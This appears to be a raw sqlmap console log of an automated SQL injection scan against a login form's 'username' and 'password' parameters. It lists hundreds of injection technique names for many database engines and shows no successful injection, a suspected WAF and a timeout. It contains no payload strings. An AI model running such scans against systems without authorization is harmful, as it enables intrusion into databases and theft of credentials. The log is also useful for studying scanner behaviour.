[16:55:07] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
[16:55:15] [INFO] testing 'Oracle stacked queries (heavy query)'
[16:55:26] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)'
[16:55:34] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'
[16:55:45] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP - comment)'
[16:55:45] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP)'
[16:55:45] [INFO] testing 'IBM DB2 stacked queries (heavy query - comment)'
[16:55:53] [INFO] testing 'IBM DB2 stacked queries (heavy query)'
[16:56:04] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[16:56:12] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[16:56:23] [INFO] testing 'Firebird stacked queries (heavy query - comment)'
[16:56:31] [INFO] testing 'Firebird stacked queries (heavy query)'
[16:56:42] [INFO] testing 'SAP MaxDB stacked queries (heavy query - comment)'
[16:56:50] [INFO] testing 'SAP MaxDB stacked queries (heavy query)'
[16:57:01] [INFO] testing 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)'
[16:57:09] [INFO] testing 'HSQLDB >= 1.7.2 stacked queries (heavy query)'
[16:57:20] [INFO] testing 'HSQLDB >= 2.0 stacked queries (heavy query - comment)'
[16:57:28] [INFO] testing 'HSQLDB >= 2.0 stacked queries (heavy query)'
[16:57:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[16:57:49] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
[16:58:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (comment)'
[16:58:08] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (comment)'
[16:58:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:58:26] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[16:58:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[16:58:44] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[16:58:52] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query)'
[16:59:03] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query)'
[16:59:14] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query - comment)'
[16:59:22] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query - comment)'
[16:59:30] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[16:59:41] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[16:59:48] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[16:59:59] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[17:00:07] [INFO] testing 'MySQL AND time-based blind (ELT)'
[17:00:19] [INFO] testing 'MySQL OR time-based blind (ELT)'
[17:00:30] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[17:00:38] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[17:00:46] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[17:00:56] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[17:01:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[17:01:16] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[17:01:24] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[17:01:35] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[17:01:46] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[17:01:55] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[17:02:03] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:02:14] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF - comment)'
[17:02:21] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
[17:02:32] [INFO] testing 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)'
[17:02:43] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)'
[17:02:51] [INFO] testing 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)'
[17:02:59] [INFO] testing 'Oracle AND time-based blind'
[17:03:10] [INFO] testing 'Oracle OR time-based blind'
[17:03:21] [INFO] testing 'Oracle AND time-based blind (comment)'
[17:03:29] [INFO] testing 'Oracle OR time-based blind (comment)'
[17:03:37] [INFO] testing 'Oracle AND time-based blind (heavy query)'
[17:03:48] [INFO] testing 'Oracle OR time-based blind (heavy query)'
[17:03:58] [INFO] testing 'Oracle AND time-based blind (heavy query - comment)'
[17:04:06] [INFO] testing 'Oracle OR time-based blind (heavy query - comment)'
[17:04:14] [INFO] testing 'IBM DB2 AND time-based blind (heavy query)'
[17:04:25] [INFO] testing 'IBM DB2 OR time-based blind (heavy query)'
[17:04:36] [INFO] testing 'IBM DB2 AND time-based blind (heavy query - comment)'
[17:04:44] [INFO] testing 'IBM DB2 OR time-based blind (heavy query - comment)'
[17:04:52] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[17:05:06] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[17:05:17] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
[17:05:25] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
[17:05:33] [INFO] testing 'Firebird >= 2.0 AND time-based blind (heavy query)'
[17:05:44] [INFO] testing 'Firebird >= 2.0 OR time-based blind (heavy query)'
[17:05:55] [INFO] testing 'Firebird >= 2.0 AND time-based blind (heavy query - comment)'
[17:06:03] [INFO] testing 'Firebird >= 2.0 OR time-based blind (heavy query - comment)'
[17:06:11] [INFO] testing 'SAP MaxDB AND time-based blind (heavy query)'
[17:06:22] [INFO] testing 'SAP MaxDB OR time-based blind (heavy query)'
[17:06:32] [INFO] testing 'SAP MaxDB AND time-based blind (heavy query - comment)'
[17:06:40] [INFO] testing 'SAP MaxDB OR time-based blind (heavy query - comment)'
[17:06:48] [INFO] testing 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)'
[17:06:59] [INFO] testing 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)'
[17:07:10] [INFO] testing 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)'
[17:07:18] [INFO] testing 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)'
[17:07:26] [INFO] testing 'HSQLDB > 2.0 AND time-based blind (heavy query)'
[17:07:37] [INFO] testing 'HSQLDB > 2.0 OR time-based blind (heavy query)'
[17:07:48] [INFO] testing 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)'
[17:07:56] [INFO] testing 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)'
[17:08:04] [INFO] testing 'Informix AND time-based blind (heavy query)'
[17:08:15] [INFO] testing 'Informix OR time-based blind (heavy query)'
[17:08:26] [INFO] testing 'Informix AND time-based blind (heavy query - comment)'
[17:08:34] [INFO] testing 'Informix OR time-based blind (heavy query - comment)'
[17:08:43] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:08:51] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:08:57] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[17:08:57] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[17:08:58] [INFO] testing 'MySQL <= 5.0.11 time-based blind - Parameter replace (heavy queries)'
[17:08:58] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[17:08:58] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[17:08:58] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[17:08:59] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
[17:08:59] [INFO] testing 'PostgreSQL time-based blind - Parameter replace (heavy query)'
[17:08:59] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)'
[17:08:59] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'
[17:08:59] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
[17:09:00] [INFO] testing 'Oracle time-based blind - Parameter replace (heavy queries)'
[17:09:00] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
[17:09:00] [INFO] testing 'Firebird time-based blind - Parameter replace (heavy query)'
[17:09:00] [INFO] testing 'SAP MaxDB time-based blind - Parameter replace (heavy query)'
[17:09:00] [INFO] testing 'IBM DB2 time-based blind - Parameter replace (heavy query)'
[17:09:01] [INFO] testing 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)'
[17:09:12] [INFO] testing 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)'
[17:09:22] [INFO] testing 'Informix time-based blind - Parameter replace (heavy query)'
[17:09:23] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[17:09:23] [INFO] testing 'MySQL <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[17:09:23] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
[17:09:24] [INFO] testing 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[17:09:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)'
[17:09:25] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)'
[17:09:25] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
[17:09:26] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[17:09:26] [INFO] testing 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[17:09:26] [INFO] testing 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
[17:09:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[17:11:13] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
it is not recommended to perform extended UNION tests if there is not at least one other (potential) technique found. Do you want to skip? [Y/n] Y
[17:13:00] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[17:14:47] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[17:16:35] [WARNING] POST parameter 'username' does not seem to be injectable
[17:16:35] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[17:16:35] [INFO] testing for SQL injection on POST parameter 'password'
[17:16:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:16:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[17:17:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[17:17:53] [WARNING] there is a possibility that the target (or WAF/IPS/IDS) is dropping 'suspicious' requests
[17:17:53] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[17:42:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)'
[17:42:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment)'
[17:42:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment) (NOT)'
[17:42:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[17:42:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[17:43:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)'
[17:43:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[17:43:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[17:43:36] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[17:43:54] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[17:44:12] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[17:44:28] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[17:44:46] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[17:45:02] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[17:45:21] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[17:45:37] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[17:45:55] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[17:46:11] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[17:46:29] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[17:46:46] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[17:46:46] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace (original value)'
[17:46:47] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace'
[17:46:47] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'
[17:46:47] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[17:46:47] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[17:46:48] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[17:46:48] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[17:46:48] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[17:46:49] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[17:46:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[17:46:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[17:46:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[17:46:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[17:46:51] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[17:46:51] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[17:46:52] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[17:46:52] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[17:46:52] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[17:46:53] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[17:46:53] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[17:46:54] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[17:46:54] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[17:46:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL) (original value)'
[17:46:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[17:46:56] [INFO] testing 'Boolean-based blind - Parameter replace (CASE) (original value)'
[17:46:56] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[17:46:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[17:46:57] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[17:46:57] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[17:46:57] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[17:46:58] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[17:46:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[17:47:00] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[17:47:01] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[17:47:02] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[17:47:02] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[17:47:03] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[17:47:04] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[17:47:05] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[17:47:06] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[17:47:07] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[17:47:23] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[17:47:23] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[17:47:39] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[17:47:56] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[17:48:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[17:48:28] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[17:48:44] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[17:49:00] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[17:49:16] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[17:49:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[17:49:38] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[17:49:49] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[17:50:01] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[17:50:12] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[17:50:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:50:33] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:50:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:50:55] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:51:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:51:16] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:51:25] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:51:35] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[17:51:46] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[17:51:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:52:04] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[17:52:13] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:52:24] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
[17:52:34] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[17:52:45] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'
[17:52:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[17:53:05] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'
[17:53:15] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:53:25] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
[17:53:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[17:53:46] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
[17:53:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[17:54:06] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[17:54:16] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[17:54:27] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
[17:54:36] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
[17:54:47] [INFO] testing 'Firebird OR error-based - WHERE or HAVING clause'
[17:54:57] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:55:06] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[17:55:06] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[17:55:06] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[17:55:07] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[17:55:07] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[17:55:07] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[17:55:07] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[17:55:07] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[17:55:08] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
[17:55:08] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'
[17:55:08] [INFO] testing 'Oracle error-based - Parameter replace'
[17:55:08] [INFO] testing 'Firebird error-based - Parameter replace'
[17:55:08] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[17:55:09] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[17:55:09] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[17:55:10] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[17:55:10] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[17:55:10] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[17:55:11] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[17:55:11] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
[17:55:12] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)'
[17:55:12] [INFO] testing 'Microsoft SQL Server/Sybase error-based - ORDER BY clause'
[17:55:13] [INFO] testing 'Oracle error-based - ORDER BY, GROUP BY clause'
[17:55:13] [INFO] testing 'Firebird error-based - ORDER BY clause'
[17:55:14] [INFO] testing 'MySQL inline queries'
[17:55:14] [INFO] testing 'PostgreSQL inline queries'
[17:55:14] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[17:55:14] [INFO] testing 'Oracle inline queries'
[17:55:14] [INFO] testing 'SQLite inline queries'
[17:55:14] [INFO] testing 'Firebird inline queries'
[17:55:15] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[17:55:23] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[17:55:33] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[17:55:41] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[17:55:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[17:56:00] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[17:56:11] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:56:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[17:56:30] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[17:56:38] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
[17:56:49] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
[17:56:57] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
[17:57:08] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:57:16] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
[17:57:27] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:57:35] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)'
[17:57:46] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
[17:57:54] [INFO] testing 'Oracle stacked queries (heavy query)'
[17:58:05] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)'
[17:58:13] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'
[17:58:24] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP - comment)'
[17:58:24] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP)'
[17:58:24] [INFO] testing 'IBM DB2 stacked queries (heavy query - comment)'
[17:58:32] [INFO] testing 'IBM DB2 stacked queries (heavy query)'
[17:58:43] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[17:58:51] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[17:59:02] [INFO] testing 'Firebird stacked queries (heavy query - comment)'
[17:59:10] [INFO] testing 'Firebird stacked queries (heavy query)'
[17:59:22] [INFO] testing 'SAP MaxDB stacked queries (heavy query - comment)'
[17:59:30] [INFO] testing 'SAP MaxDB stacked queries (heavy query)'
[17:59:40] [INFO] testing 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)'
[17:59:48] [INFO] testing 'HSQLDB >= 1.7.2 stacked queries (heavy query)'
[18:00:00] [INFO] testing 'HSQLDB >= 2.0 stacked queries (heavy query - comment)'
[18:00:08] [INFO] testing 'HSQLDB >= 2.0 stacked queries (heavy query)'
[18:00:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[18:00:30] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
[18:00:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (comment)'
[18:00:49] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (comment)'
[18:00:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:01:09] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[18:01:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[18:01:28] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[18:01:35] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query)'
[18:01:47] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query)'
[18:01:58] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query - comment)'
[18:02:06] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query - comment)'
[18:02:14] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[18:02:25] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[18:02:33] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[18:02:44] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[18:02:52] [INFO] testing 'MySQL AND time-based blind (ELT)'
[18:03:03] [INFO] testing 'MySQL OR time-based blind (ELT)'
[18:03:14] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[18:03:22] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[18:03:31] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:03:41] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
[18:03:52] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
[18:04:00] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
[18:04:08] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
[18:04:19] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'
[18:04:30] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
[18:04:39] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'
[18:04:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
